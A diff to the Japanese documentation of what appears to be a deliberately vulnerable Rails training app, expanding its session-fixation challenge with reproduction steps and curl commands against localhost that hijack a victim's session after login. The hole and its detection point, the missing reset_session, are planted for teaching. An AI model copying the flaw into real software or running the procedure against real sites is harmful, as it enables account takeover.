@@ -154,11 +154,24 @@ VULN_CHALLENGES=session_fixation bin/rails server -b 127.0.0.1
 ```
 
 `SessionsController#create` が上書きされ、`reset_session` が呼ばれなくなります。
-ログイン前後でセッション ID が変わらないため、攻撃者が事前にセッション ID をセットしておくと、被害者のログイン後もそのセッションを乗っ取れます。
+アプリは ActiveRecordStore を使用しており、セッション ID はサーバー側 DB で管理されます。
+攻撃者が事前に取得したセッション ID を被害者に使わせると、ログイン後も攻撃者の ID で被害者のセッションにアクセスできます。
 
 再現手順:
-1. ログイン前のセッション Cookie を記録
-2. ログイン後に同じセッション Cookie が使われていることを確認
+1. 攻撃者: `GET /login` でセッション Cookie (`_session_id=XXXXX`) を取得
+2. 被害者: 同じ `_session_id=XXXXX` を Cookie にセットした状態でログイン
+   （XSS や中間者攻撃でセッション ID を固定化するシナリオ）
+3. 攻撃者: `_session_id=XXXXX` のまま `/tasks` にアクセス → 200（乗っ取り成功）
+
+```bash
+# curl での確認例
+SESSION=$(curl -si http://localhost:3000/login | grep set-cookie | grep -o '_session_id=[^;]*')
+# 被害者ログイン（同じセッションIDを使用）
+curl -b "$SESSION" -c /tmp/victim.txt -X POST http://localhost:3000/login \
+  -d "email=victim@example.com&password=password123&authenticity_token=..."
+# 攻撃者: 同じセッションIDで認証済みページにアクセス
+curl -b "$SESSION" http://localhost:3000/tasks
+```
 
 検出ポイント: `lib/vulnerabilities/challenges/session_fixation.rb` — `reset_session` の欠落
 
